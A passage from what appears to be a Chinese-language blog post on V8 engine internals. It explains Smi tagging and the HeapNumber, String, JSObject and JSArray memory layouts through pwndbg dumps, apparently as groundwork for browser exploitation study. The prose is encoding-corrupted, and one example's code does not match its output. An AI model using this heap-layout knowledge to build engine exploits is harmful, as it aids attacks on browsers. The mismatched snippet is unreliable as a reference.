title="Smiï¼ˆå°æ•´æ•°ï¼‰"></a>Smiï¼ˆå°æ•´æ•°ï¼‰</h4><ul><li>LSBå§‹ç»ˆä¸º0</li><li>åœ¨32ä½ä¸Šï¼Œsmiå³ç§»1ä½å¯ä»¥è·å¾—åŸå§‹å€¼ï¼Œ64ä½è¦å³ç§»32ä½ã€‚smiè¡¨ç¤ºçš„æ•´æ•°èŒƒå›´æ˜¯æœ‰ç¬¦å·çš„31&#x2F;32ä½æ•´æ•°</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  A[&quot;Signed Value (31 bit) ï½œ 0&quot;] </span><br><span class="line">  C[&quot;Signed Value (32 bit) ï½œ 0-Padding (31 bit) ï½œ 0&quot;] </span><br></pre></td></tr></table></figure></div><h4 id="æŒ‡å‘HeapObjectçš„æŒ‡é’ˆ"><a href="#æŒ‡å‘HeapObjectçš„æŒ‡é’ˆ" class="headerlink" title="æŒ‡å‘HeapObjectçš„æŒ‡é’ˆ"></a>æŒ‡å‘HeapObjectçš„æŒ‡é’ˆ</h4><ul><li>LSBä¸º1</li><li>ä¸‹å›¾ä¸º32&#x2F;64ä½ç¤ºä¾‹</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  A[&quot;Pointer (31 bit) ï½œ 1&quot;] --&gt; B[&quot;HeapObject&quot;] </span><br><span class="line">  C[&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Pointer (63 bit)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ï½œ 1&quot;]  --&gt; D[&quot;HeapObject&quot;] </span><br></pre></td></tr></table></figure></div><blockquote><p>ğŸ¤“ğŸ‘†ğŸ»ä½¿ç”¨<code>Tagged Value</code>åŒºåˆ†smiå’ŒæŒ‡å‘HeapObjectçš„æŒ‡é’ˆå¯ä»¥èŠ‚çœå †ç©ºé—´</p></blockquote><h2 id="0x03-å…³é”®çš„HeapObjectğŸ§"><a href="#0x03-å…³é”®çš„HeapObjectğŸ§" class="headerlink" title="0x03 å…³é”®çš„HeapObjectğŸ§"></a>0x03 å…³é”®çš„HeapObjectğŸ§</h2><h3 id="HeapNumber"><a href="#HeapNumber" class="headerlink" title="HeapNumber"></a>HeapNumber</h3><p>å‰é¢ä¹Ÿæåˆ°smiåªèƒ½è¡¨ç¤ºæœ‰ç¬¦å·çš„31&#x2F;32ä½æ•´æ•°ï¼Œè¶…è¿‡è¿™ä¸ªèŒƒå›´çš„æ•´æ•°å¯ä»¥ä»¥doubleå€¼çš„å½¢å¼ä¿å­˜åœ¨HeapNumberé‡Œé¢,HeapNumberç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  C[&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Pointer (63 bit)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ï½œ 1&quot;]  --&gt; D[&quot;Map* | Value&quot;] </span><br></pre></td></tr></table></figure></div><blockquote><p>å…¶ä¸­<code>Map*</code>è¡¨ç¤ºæ•´ä¸ª<code>HeapObject</code>çš„ç±»å‹,è¡¨ç¤ºçš„æ•´æ•°å°±ä»¥doubleçš„å½¢å¼å­˜åœ¨<code>Value</code>ä¸­</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å­˜å‚¨äº†æ•°å­—çš„å †å¯¹è±¡</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeapNumber</span> : <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// è¿”å›å­˜å‚¨çš„ double ç±»å‹çš„å€¼</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">double</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">READ_DOUBLE_FIELD</span>(<span class="keyword">this</span>, kValueOffset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å†™å…¥ double å€¼åˆ°å¯¹è±¡</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">set_value</span><span class="params">(<span class="type">double</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">WRITE_DOUBLE_FIELD</span>(<span class="keyword">this</span>, kValueOffset, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å°†å¯¹è±¡è½¬æ¢ä¸º HeapNumber æŒ‡é’ˆ</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> HeapNumber* <span class="title">cast</span><span class="params">(Object* obj)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† HeapNumber è½¬æ¢ä¸ºå¸ƒå°”å€¼</span></span><br><span class="line">    <span class="function">Object* <span class="title">HeapNumberToBoolean</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†…å­˜å¸ƒå±€æè¿°</span></span><br><span class="line">    <span class="comment">// kSize ä¹‹å‰çš„ç©ºé—´å­˜å‚¨ map å¯¹è±¡çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kValueOffset = HeapObject::kSize; <span class="comment">//åç§»</span></span><br><span class="line">    <span class="comment">// kValueOffset è¡¨ç¤ºå­˜å‚¨æ•°å­—å€¼çš„åç§»é‡ï¼Œç±»å‹ä¸º double</span></span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kSize = kValueOffset + kDoubleSize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// ç¦æ­¢éšå¼æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="built_in">DISALLOW_IMPLICIT_CONSTRUCTORS</span>(HeapNumber);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></blockquote><p>ä¸¾ä¸ªä¾‹å­ğŸŒ°</p><p>å†™ä¸€ä¸ªobject arrayï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯smiï¼Œç¬¬äºŒä¸ªè¶…è¿‡smièŒƒå›´ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å­—ç¬¦ä¸²</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr =[<span class="number">0xdeadbee</span>,<span class="number">0xdeadbeef</span>,<span class="string">&quot;sloth&quot;</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x02aaab84dda9</span> &lt;<span class="title class_">JSArray</span>[<span class="number">3</span>]&gt;</span><br></pre></td></tr></table></figure></div><p>gdbçœ‹ä¸€ä¸‹è¿™å—å†…å­˜(-1æ˜¯å› ä¸ºtagged value),è¿™é‡Œå¯èƒ½æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„v8æŠŠarrayåˆåšäº†ä¸€å±‚å°è£…ï¼Œå°è£…åˆ°FixedArrayä¸­</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x02aaab84dda9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x2aaab84dda8</span>:<span class="number">0x00000a0c4dc82f79</span>(Map*)<span class="number">0x00001179f91c0c71</span>(FixedArray)</span><br><span class="line"><span class="number">0x2aaab84ddb8</span>:<span class="number">0x000002aaab84dd09</span>(æŒ‡å‘çœŸå®arrayçš„pointer)<span class="number">0x0000000300000000</span>(è¡¨ç¤ºé•¿åº¦)</span><br></pre></td></tr></table></figure></div><p>ç»§ç»­è®¿é—®çœŸå®çš„æ•°ç»„</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x000002aaab84dd09</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x2aaab84dd08</span>:<span class="number">0x00001179f91c0851</span>(Map*)<span class="number">0x0000000300000000</span>(æ•°ç»„é•¿åº¦)</span><br><span class="line"><span class="number">0x2aaab84dd18</span>:<span class="number">0x0deadbee00000000</span>(Smi)<span class="number">0x0000064aeec1f311</span>(HeapNumber Pointer)</span><br><span class="line"><span class="number">0x2aaab84dd28</span>:<span class="number">0x0000064aeec1f229</span>(<span class="string">&quot;sloth&quot;</span>)<span class="number">0x00001179f91c0851</span></span><br><span class="line"><span class="number">0x2aaab84dd38</span>:<span class="number">0x0000000400000000</span><span class="number">0x000013ab2a603b29</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0000064aeec1f229</span></span><br><span class="line"><span class="meta">#sloth</span></span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›HeapNumber</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x0000064aeec1f311</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x64aeec1f310</span>:<span class="number">0x00001179f91c0561</span><span class="number">0x41ebd5b7dde00000</span>(<span class="number">0xdeadbeef</span>çš„<span class="type">double</span>è¡¨ç¤º)</span><br><span class="line">pwndbg&gt; job <span class="number">0x41ebd5b7dde00000</span></span><br><span class="line">Smi: <span class="number">0x41ebd5b7</span> (<span class="number">1105974711</span>)</span><br></pre></td></tr></table></figure></div><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p> ç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  C[&quot;Pointer (63 bit)ï½œ 1&quot;]  --&gt; D[&quot;Map* | HashFieldï½œLengthï½œString[0:8]ï½œString[8:16]&quot;] </span><br></pre></td></tr></table></figure></div><p>ä¸¾ä¸ªä¾‹å­ğŸŒ°</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr =[<span class="string">&quot;passion&quot;</span>,<span class="string">&quot;free&quot;</span>,<span class="string">&quot;sloth&quot;</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x20c46b60dda1</span> &lt;<span class="title class_">JSArray</span>[<span class="number">3</span>]&gt;</span><br></pre></td></tr></table></figure></div><p>æŸ¥çœ‹è¿™å—å†…å­˜,è·Ÿè¿›çœŸæ­£çš„array</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x20c46b60dda1</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x20c46b60dda0</span>:<span class="number">0x00001f8f0c182f79</span><span class="number">0x000028e799a40c71</span></span><br><span class="line"><span class="number">0x20c46b60ddb0</span>:<span class="number">0x000020c46b60dd01</span><span class="number">0x0000000300000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">6</span>gx <span class="number">0x000020c46b60dd01</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x20c46b60dd00</span>:<span class="number">0x000028e799a40851</span>(Map*)<span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0x20c46b60dd10</span>:<span class="number">0x00001fa5bd15f229</span>(<span class="string">&quot;passion&quot;</span>)<span class="number">0x00001fa5bd15f241</span>(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"><span class="number">0x20c46b60dd20</span>:<span class="number">0x00001fa5bd15f259</span>(<span class="string">&quot;sloth&quot;</span>)<span class="number">0x000028e799a40851</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00001fa5bd15f229</span></span><br><span class="line"><span class="meta">#passion</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00001fa5bd15f241</span></span><br><span class="line"><span class="meta">#free</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00001fa5bd15f259</span></span><br><span class="line"><span class="meta">#sloth</span></span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²passion</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00001fa5bd15f229</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x1fa5bd15f228</span>:<span class="number">0x000028e799a40461</span>(map*)<span class="number">0x00000007a35b4466</span>(å‰å››å­—èŠ‚æ˜¯length <span class="number">7</span>ï¼Œåå››å­—èŠ‚æ˜¯HashField)</span><br><span class="line"><span class="number">0x1fa5bd15f238</span>:<span class="number">0x006e6f6973736170</span>(<span class="string">&quot;passion&quot;</span>)<span class="number">0x000028e799a40461</span>(map*)</span><br><span class="line"><span class="number">0x1fa5bd15f248</span>:<span class="number">0x0000000401ff50c2</span>(length <span class="number">7</span> HashField)<span class="number">0x0000000065657266</span>(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"><span class="number">0x1fa5bd15f258</span>:<span class="number">0x000028e799a40461</span>(map*)<span class="number">0x00000005a5bcda06</span>(length <span class="number">6</span> HashField)</span><br><span class="line"><span class="number">0x1fa5bd15f268</span>:<span class="number">0x00000068746f6c73</span>(<span class="string">&quot;sloth&quot;</span>)<span class="number">0x000028e799a40461</span></span><br><span class="line">pwndbg&gt; <span class="function">python <span class="title">print</span><span class="params">(bytes.fromhex(<span class="string">&quot;6e6f6973736170&quot;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>))</span></span></span><br><span class="line"><span class="function">noissap</span></span><br><span class="line"><span class="function">pwndbg&gt; python <span class="title">print</span><span class="params">(bytes.fromhex(<span class="string">&quot;65657266&quot;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>))</span></span></span><br><span class="line"><span class="function">eerf</span></span><br><span class="line"><span class="function">pwndbg&gt; python <span class="title">print</span><span class="params">(bytes.fromhex(<span class="string">&quot;68746f6c73&quot;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>))</span></span></span><br><span class="line"><span class="function">htols</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å€’ç€å­˜</p></blockquote><h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><ul><li>ç»§æ‰¿â¾ƒObjectï¼ŒHeapObjectï¼ŒJSReceiver</li><li>Propertiesé€šè¿‡â¼€ä¸ªFixedArray(å®šâ»“æ•°ç»„ï¼‰ä¿å­˜æ‰€æœ‰çš„å‘½åå±æ€§</li><li>Elementsé€šè¿‡â¼€ä¸ªFixedArrayä¿å­˜æ‰€æœ‰çš„æ•°å­—ç´¢å¼•çš„å±æ€§</li></ul><p>ç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  C[&quot;Pointer (63 bit)ï½œ 1&quot;]  --&gt; D[&quot;Map* | Properties* ï½œ Elements*&quot;] </span><br></pre></td></tr></table></figure></div><h3 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h3><p>ç»§æ‰¿Object, HeapObject, JSReceiver, JSObjectï¼Œç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt; B[JSArray]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[Length]</span><br><span class="line">    E --&gt; G[FixedArray]</span><br><span class="line">    G --&gt; H[Map*]</span><br><span class="line">    G --&gt; I[Length]</span><br><span class="line">    G --&gt; J[&quot;Elements[0]&quot;]</span><br><span class="line">    G --&gt; K[&quot;Elements[1]&quot;]</span><br><span class="line">    G --&gt; M[&quot;....&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>JSArrayä¸­Elementsçš„ç±»å‹</p><ul><li><a class="link"   href="https://v8.dev/blog/elements-kinds" >https://v8.dev/blog/elements-kinds <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>â¼©æ•´æ•°ï¼Œä¹Ÿç§°ä¸º Smi</li><li>Doubleï¼Œâ½¤äºä¸èƒ½è¡¨â½°ä¸º Smi çš„æµ®ç‚¹æ•°å’Œæ•´æ•°ã€‚</li><li>å¸¸è§„å…ƒç´ ï¼Œâ½¤äºâ½†æ³•è¡¨â½°ä¸ºSmiæˆ–doubleçš„å€¼ã€‚</li></ul><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// elements kind: PACKED_SMI_ELEMENTS</span></span><br><span class="line">array.<span class="title function_">push</span>(<span class="number">4.56</span>);</span><br><span class="line"><span class="comment">// elements kind: PACKED_DOUBLE_ELEMENTS</span></span><br><span class="line">array.<span class="title function_">push</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="comment">// elements kind: PACKED_ELEMENTS</span></span><br><span class="line">array.<span class="property">length</span>; <span class="comment">// 5</span></span><br><span class="line">array[<span class="number">9</span>] = <span class="number">1</span>; <span class="comment">// array[5] until array[8] are now holes</span></span><br><span class="line"><span class="comment">//array[5] -- array[8] :elements kind: HOLEY_ELEMENTS</span></span><br></pre></td></tr></table></figure></div><p>ä¸¾ä¸ªä¾‹å­ğŸŒ°</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x08e88570ddc9</span> &lt;<span class="title class_">JSArray</span>[<span class="number">2</span>]&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x08e88570ddc9</span></span><br><span class="line"><span class="number">0x8e88570ddc9</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x2e172c042ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x0afb86dd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x08e88570dda9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">2</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x17eb01180c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x07cfb6f401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x08e88570dda9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/4gx <span class="number">0x08e88570ddc9</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x8e88570ddc8</span>:<span class="number">0x00002e172c042ed9</span><span class="number">0x000017eb01180c71</span></span><br><span class="line"><span class="number">0x8e88570ddd8</span>:<span class="number">0x000008e88570dda9</span><span class="number">0x0000000200000000</span></span><br><span class="line">pwndbg&gt; x/10gx <span class="number">0x000008e88570dda9</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x8e88570dda8</span>:<span class="number">0x000017eb011814f9</span><span class="number">0x0000000200000000</span></span><br><span class="line"><span class="number">0x8e88570ddb8</span>:<span class="number">0x3ff0000000000000</span>(<span class="number">1</span>)<span class="number">0x3ff199999999999a</span>(<span class="number">1.1</span>çš„hexè¡¨ç¤º)</span><br><span class="line"><span class="number">0x8e88570ddc8</span>:<span class="number">0x00002e172c042ed9</span><span class="number">0x000017eb01180c71</span></span><br><span class="line"><span class="number">0x8e88570ddd8</span>:<span class="number">0x000008e88570dda9</span><span class="number">0x0000000200000000</span></span><br><span class="line"><span class="number">0x8e88570dde8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x000008e88570dda9</span></span><br><span class="line"><span class="number">0x8e88570dda9</span>: [<span class="title class_">FixedDoubleArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17eb011814f9</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">1.1</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œ1.1æ²¡æœ‰ç”¨HeapNumberï¼Œdoubleå€¼åœ¨double arrayé‡Œæ˜¯ç›´æ¥å­˜çš„ï¼Œå¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´</p></blockquote><p>ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å˜æˆobject array</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">let arr = [<span class="number">1</span>, <span class="number">1.1</span>];</span><br><span class="line">%<span class="built_in">DebugPrint</span>(arr);</span><br><span class="line">%<span class="built_in">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x17dcd1e4ddf9</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x17dcd1e4dd99</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x17dcd1e4dd98</span>:<span class="number">0x000004fddb340801</span><span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0x17dcd1e4dda8</span>:<span class="number">0x0000000100000000</span>(<span class="number">1</span>)<span class="number">0x00003aaf2dc1f2f9</span>(HeapNumber Pointer)</span><br><span class="line"><span class="number">0x17dcd1e4ddb8</span>:<span class="number">0x000017dcd1e4ddc1</span><span class="number">0x0000376224680459</span></span><br><span class="line"><span class="number">0x17dcd1e4ddc8</span>:<span class="number">0x000004fddb340c71</span><span class="number">0x000004fddb340c71</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x17dcd1e4ddf9</span></span><br><span class="line"><span class="number">0x17dcd1e4ddf9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x376224682f79</span> &lt;<span class="built_in">Map</span>(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x3aaf2dc11111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x17dcd1e4dd99</span> &lt;FixedArray[<span class="number">3</span>]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: <span class="number">3</span></span><br><span class="line"> - properties: <span class="number">0x04fddb340c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2d9d450001a9 <span class="string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x17dcd1e4dd99</span> &lt;FixedArray[<span class="number">3</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">0x3aaf2dc1f2f9</span> &lt;HeapNumber <span class="number">1.1</span>&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x17dcd1e4ddc1</span> &lt;Object map = <span class="number">0x376224680459</span>&gt;</span><br><span class="line"> 